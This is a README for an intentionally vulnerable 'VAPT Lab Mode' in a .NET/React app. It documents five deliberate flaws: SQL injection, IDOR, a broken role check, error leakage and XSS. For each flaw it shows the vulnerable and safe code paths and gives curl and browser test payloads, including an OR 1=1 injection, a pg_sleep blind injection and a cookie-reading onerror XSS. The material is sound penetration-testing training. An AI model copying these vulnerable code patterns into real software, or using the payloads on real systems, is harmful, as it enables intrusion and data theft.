# VAPT Lab Mode

> **WARNING — Lab Use Only**
> This mode intentionally introduces security vulnerabilities into the application.
> **Never enable it in production or with real user data.**
> It exists solely to demonstrate, test, and document attack scenarios as part of a
> Vulnerability Assessment and Penetration Testing (VAPT) exercise.

---

## How to Enable / Disable

### Backend (API)

Set the environment variable before starting the API:

```bash
# Enable (lab only)
ENABLE_VAPT_LAB_MODE=true dotnet run --project src/NoAsAService.Api

# Disable (default, safe)
ENABLE_VAPT_LAB_MODE=false dotnet run --project src/NoAsAService.Api
```

Or add it to `src/NoAsAService.Api/Properties/launchSettings.json` under your chosen profile:

```json
"environmentVariables": {
  "ENABLE_VAPT_LAB_MODE": "true"
}
```

When the API starts in VAPT mode a prominent warning is printed to the console log:

```
VAPT LAB MODE ENABLED — intentionally vulnerable
DO NOT use in production or with real data!
```

You can verify via the root endpoint:

```bash
curl http://localhost:5000/
# { "service": "no-as-a-service", ..., "vaptLabMode": true }
```

### Frontend (React)

Create a `.env.local` file in `src/web/`:

```bash
# src/web/.env.local
VITE_ENABLE_VAPT_LAB_MODE=true
```

Then restart the Vite dev server. A red banner will appear at the top of every page.

---

## Affected Endpoints and Pages

| #   | Vulnerability     | Location                                            | Safe behaviour                     | VAPT behaviour                                     |
| --- | ----------------- | --------------------------------------------------- | ---------------------------------- | -------------------------------------------------- |
| 1   | SQL Injection     | `GET /customers?search=`                            | EF Core parameterised query        | Raw SQL string concatenation                       |
| 2   | IDOR              | `GET /projects/{id}`                                | Ownership check (403 if not owner) | No ownership check (any user can read any project) |
| 3   | Broken Role Check | `GET /admin/stats`                                  | Requires `admin` role claim        | Only requires authentication                       |
| 4   | Error Leakage     | Any unhandled exception + `GET /vapt/trigger-error` | Generic 500 message                | Full stack trace + exception type                  |
| 5   | XSS               | Customer Detail page → Notes field                  | Rendered as plain text             | Rendered via `dangerouslySetInnerHTML`             |

---

## Vulnerability Details and Manual Test Instructions

### 1 — SQL Injection (`GET /customers?search=`)

**How the vulnerability works (VAPT mode, real PostgreSQL only):**
The search string is concatenated directly into a raw SQL query without escaping or
parameterisation. An attacker who can reach the endpoint can inject arbitrary SQL.

**Safe vs. vulnerable code path in `Program.cs`:**

```csharp
// VAPT mode (vulnerable): string concatenated into raw SQL
var rawSql = $"""SELECT ... FROM customers WHERE "Name" ILIKE '%{search}%'""";
db.Customers.FromSqlRaw(rawSql)

// Safe mode: EF Core generates a parameterised query automatically
db.Customers.Where(c => c.Name.Contains(search))
```

**Manual test (requires a running PostgreSQL instance):**

```bash
# Normal search
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:5000/customers?search=Acme"

# SQL Injection payload — dumps all rows regardless of Name
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:5000/customers?search=%25' OR '1'='1' --"

# Time-based blind injection (PostgreSQL)
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:5000/customers?search=x' OR pg_sleep(3)='1"
```

> **Note:** The raw-SQL path is skipped for InMemoryDatabase (test environment). To
> exercise actual injection, run the API with `DATABASE_CONNECTION_STRING` pointing to
> a local PostgreSQL instance.

---

### 2 — IDOR / Broken Access Control (`GET /projects/{id}`)

**How the vulnerability works (VAPT mode):**
When a project is created its `OwnerUserId` is stamped with the creator's user ID.
In safe mode, `GET /projects/{id}` verifies `project.OwnerUserId == currentUserId`
and returns `403 Forbidden` for other users. In VAPT mode this check is absent — any
authenticated user can retrieve any project by guessing its numeric ID.

**Manual test:**

```bash
# Register two users and log in
TOKEN_A=$(curl -s -X POST http://localhost:5000/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"AlicePass123456"}' | jq -r .token)

TOKEN_B=$(curl -s -X POST http://localhost:5000/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"bob","password":"BobPassw0rd123"}' | jq -r .token)

# User A creates a project (note the returned id, e.g. 7)
curl -s -X POST http://localhost:5000/projects \
  -H "Authorization: Bearer $TOKEN_A" \
  -H 'Content-Type: application/json' \
  -d '{"name":"Secret Project","customerId":1}'

# Safe mode: User B gets 403
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN_B" \
  http://localhost:5000/projects/7
# → 403

# VAPT mode: User B gets 200
# → 200 with full project data
```

---

### 3 — Broken Role Check (`GET /admin/stats`)

**How the vulnerability works (VAPT mode):**
In safe mode the endpoint checks that the JWT contains a `ClaimTypes.Role = "admin"` claim.
This claim is issued only when the user registers with the username `admin`.
In VAPT mode the role check is skipped — any authenticated user can access the
admin stats.

**Manual test:**

```bash
# Get a token for a regular user
TOKEN=$(curl -s -X POST http://localhost:5000/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"regularuser","password":"Regular123456"}' | jq -r .token)

# Safe mode → 403 Forbidden
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/admin/stats

# VAPT mode → 200 OK (privilege escalation)
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/admin/stats
```

To get a legitimate admin token in safe mode:

```bash
# Register with reserved username "admin"
curl -X POST http://localhost:5000/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Admin1234567890"}'

TOKEN_ADMIN=$(curl -s -X POST http://localhost:5000/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Admin1234567890"}' | jq -r .token)

curl -s -H "Authorization: Bearer $TOKEN_ADMIN" \
  http://localhost:5000/admin/stats
# → 200 OK
```

---

### 4 — Error Leakage (`GET /vapt/trigger-error`)

**How the vulnerability works (VAPT mode):**
An unhandled exception normally returns a `500` response. In VAPT mode the middleware
serialises the full `Exception.Message`, `Exception.GetType().FullName`, and
`Exception.StackTrace` into the response body. This can expose internal paths,
third-party library versions, connection strings embedded in exception messages, etc.

**Manual test:**

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"testuser","password":"TestPass12345"}' | jq -r .token)

# Safe mode — generic message only
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/vapt/trigger-error
# → {"status":"error","message":"An unexpected error occurred."}

# VAPT mode — full stack trace exposed
# → {"status":"error","message":"Simulated internal error...","exceptionType":"System.InvalidOperationException","stackTrace":"..."}
```

---

### 5 — XSS (`CustomerDetailPage` → Notes field)

**How the vulnerability works (VAPT mode):**
The Notes textarea on the Customer Detail page is rendered via React's
`dangerouslySetInnerHTML` in VAPT mode. Any HTML or JavaScript the user types is
interpreted by the browser. In safe mode React renders the value as an escaped string.

**Manual test (browser):**

1. Enable `VITE_ENABLE_VAPT_LAB_MODE=true` in `src/web/.env.local` and restart Vite.
2. Navigate to any customer detail page.
3. In the Notes field type:
   ```html
   <img src="x" onerror="alert('XSS: ' + document.cookie)" />
   ```
4. An alert dialog should appear immediately.

**Safe mode:** the same string is rendered as literal text — no alert.

---

## Running the Automated Tests

```bash
# Run all tests (includes VAPT lab tests)
dotnet test src/tests/NoAsAService.Api.Tests/

# Run only VAPT lab tests
dotnet test src/tests/NoAsAService.Api.Tests/ --filter "FullyQualifiedName~VaptLabTests"
```

Tests are in [VaptLabTests.cs](../../src/tests/NoAsAService.Api.Tests/VaptLabTests.cs).
They spin up the API with `WebApplicationFactory` using an in-memory database and
toggle `ENABLE_VAPT_LAB_MODE` via `ConfigureAppConfiguration`.

> **Note on SQL injection tests:** The automated tests run against InMemoryDatabase
> which does not support `FromSqlRaw`. In VAPT mode the injection path is therefore
> skipped and the test only verifies the endpoint responds correctly. For a real
> injection PoC run the API with a PostgreSQL connection string.

---

## Restoring Safe Behaviour

Remove or set to `false` the two flags and restart:

```bash
ENABLE_VAPT_LAB_MODE=false   # API
# delete src/web/.env.local  # Frontend
```

All five vulnerability paths are guarded by `if (!vaptLabMode)` / `if (vaptLabMode)`
blocks — removing the flag restores all safe defaults without any code change.

---

## Code Markers

Every intentional vulnerability is marked with a comment directly in the source:

```
// INTENTIONAL VAPT LAB VULNERABILITY: <description>
```

Search the repository for this string to find all affected lines:

```bash
grep -rn "INTENTIONAL VAPT LAB VULNERABILITY" src/
```
